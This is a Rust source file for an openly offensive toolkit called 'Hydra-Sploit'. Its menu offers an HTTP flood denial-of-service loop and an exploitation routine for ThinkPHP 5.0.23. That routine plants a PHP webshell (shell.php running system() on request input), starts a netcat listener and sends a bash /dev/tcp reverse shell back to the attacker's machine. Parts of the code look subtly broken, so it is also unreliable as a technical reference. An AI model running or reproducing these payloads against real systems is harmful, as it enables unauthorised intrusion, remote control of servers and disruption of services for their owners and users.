// rust-toolkit.rs - Multi-Tool Framework (Hydra-Sec Edition)
use std::io::{self, Write};
use std::net::{TcpStream, UdpSocket};
use std::process::Command;
use std::str::from_utf8;
use std::thread;
use std::time::Duration;

mod c2 {
    use super::*;
    
    pub fn start_c2() {
        println!("\n[!] Starting Autonomous C2 Exploitation Framework...");
        print!("Enter target IP: "); io::stdout().flush().unwrap();
        let mut target = String::new();
        io::stdin().read_line(&mut target).unwrap();
        let target = target.trim();

        print!("Enter target port: "); io::stdout().flush().unwrap();
        let mut port = String::new();
        io::stdin().read_line(&mut port).unwrap();
        let port: u16 = port.trim().parse().unwrap_or(80);

        let target_addr = format!("{}:{}", target, port);

        println!("\n[*] Scanning {} for vulns...", target_addr);
        if scan_and_exploit(&target_addr) {
            println!("[+] Exploit succeeded! Spawning reverse shell...");
            spawn_reverse_shell(target, port);
        } else {
            println!("[-] Exploitation failed. Target not vulnerable or offline.");
        }
    }

    fn scan_and_exploit(addr: &str) -> bool {
        println!("[*] Fingerprinting service on {}...", addr);

        // Attempt to detect open port and send probe
        if TcpStream::connect(&addr).is_ok() {
            println!("[+] Port {} open. Enumerating banners...", addr);
            // Match known vulns (example: ThinkPHP 5.0.23 RCE)
            if probe_thinkphp(&addr) {
                println!("[!] ThinkPHP 5.0.23 detected — Exploiting...");
                return deliver_thinkphp_payload(&addr);
            }
            // Add more vuln checks here (Log4j, Spring4Shell, etc.)
            false
        } else {
            false
        }
    }

    fn probe_thinkphp(addr: &str) -> bool {
        let client = reqwest::blocking::Client::new();
        let url = format!("http://{}/index.php?s=captcha", addr);
        let payload = "a=echo 'VULN_CHECK';";
        if let Ok(res) = client.post(&url).body(payload.to_string()).send() {
            return res.text().map(|t| t.contains("VULN_CHECK")).unwrap_or(false);
        }
        false
    }

    fn deliver_thinkphp_payload(addr: &str) -> bool {
        let client = reqwest::blocking::Client::new();
        // Real exploit: Code injection via method filter
        let url = format!("http://{}/index.php?s=captcha", addr);
        let cmd = "echo \"<?php if(isset(\$_REQUEST['cmd'])) { system(\$_REQUEST['cmd']); } ?>\" > /var/www/html/shell.php";
        let payload = format!("a={}", cmd);
        client.post(&url).body(payload).send().is_ok()
    }

    fn spawn_reverse_shell(ip: &str, _port: u16) {
        println!("[+] Deploying reverse shell payload...");
        // Reverse shell via PHP webshell
        let webshell_url = format!("http://{}/shell.php?cmd=", ip);
        let reverse_ip = get_local_ip(); // Attacker IP
        let reverse_port = 4444;

        // Start listener in new thread
        thread::spawn(move || {
            println!("[*] Starting reverse shell listener on {}:{}", reverse_ip, reverse_port);
            Command::new("nc")
                .arg("-lvnp")
                .arg(reverse_port.to_string())
                .spawn()
                .expect("Netcat not available. Install nc.");
        });

        let reverse_cmd = format!("bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'", reverse_ip, reverse_port);
        let encoded_cmd = urlencoding::encode(&reverse_cmd);
        let full_url = format!("{}{}", webshell_url, encoded_cmd);
        
        if reqwest::blocking::get(&full_url).is_ok() {
            println!("[!] Reverse shell sent! Check listener.");
        } else {
            println!("[-] Failed to trigger reverse shell.");
        }
    }

    fn get_local_ip() -> String {
        use std::net::UdpSocket;
        let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
        socket.connect("8.8.8.8:8").ok();
        socket.local_addr().unwrap().ip().to_string()
    }
}

mod dos {
    use super::*;
    
    pub fn start_dos() {
        println!("\n[!] Launching MB-Sized Denial-of-Service Attack");
        print!("Enter target URL or IP: "); io::stdout().flush().unwrap();
        let mut target = String::new();
        io::stdin().read_line(&mut target).unwrap();
        let target = target.trim();

        print!("Enter port (80 for HTTP): "); io::stdout().flush().unwrap();
        let mut port_input = String::new();
        io::stdin().read_line(&mut port_input).unwrap();
        let port: u16 = port_input.trim().parse().unwrap_or(80);

        print!("Enter packet size in MB: "); io::stdout().flush().unwrap();
        let mut mb_input = String::new();
        io::stdin().read_line(&mut mb_input).unwrap();
        let mb: usize = mb_input.trim().parse().unwrap_or(10);
        let packet_size = mb * 1024 * 1024; // MB to bytes

        println!("[*] Flooding {}:{} with {} MB packets...", target, port, mb);
        let addr = format!("{}:{}", target, port);

        let client = reqwest::blocking::Client::new();
        let url = format!("http://{}", addr);
        let large_body = "A".repeat(packet_size);

        loop {
            thread::spawn(|| {
                let _ = client.post(&url).body(large_body.clone()).send();
            });
            thread::sleep(Duration::from_millis(50));
        }
    }
}

fn main() {
    loop {
        println!("\nHydra-Sploit - Framework Exploitation Toolkit (Made By Hydra-Sec Assasssin Malaysia)");
        println!("[1] - MB-Sized Denial-of-Service (DoS)");
        println!("[2] - Autonomous C2 Exploitation Framework (RCE + Reverse Shell)");
        println!("[0] - Exit");
        print!("\nChoose option: ");
        io::stdout().flush().unwrap();

        let mut choice = String::new();
        io::stdin().read_line(&mut choice).unwrap();
        let choice: u8 = match choice.trim().parse() {
            Ok(n) => n,
            Err(_) => {
                println!("Invalid input.");
                continue;
            }
        };

        match choice {
            1 => dos::start_dos(),
            2 => c2::start_c2(),
            0 => {
                println!("Exiting...");
                break;
            }
            _ => println!("Invalid option."),
        }
    }
}

// Dependencies: Add to Cargo.toml
/*
[dependencies]
reqwest = { version = "0.11", features = ["blocking"] }
tokio = { version = "1", features = ["full"] }
urlencoding = "2.1.0"
*/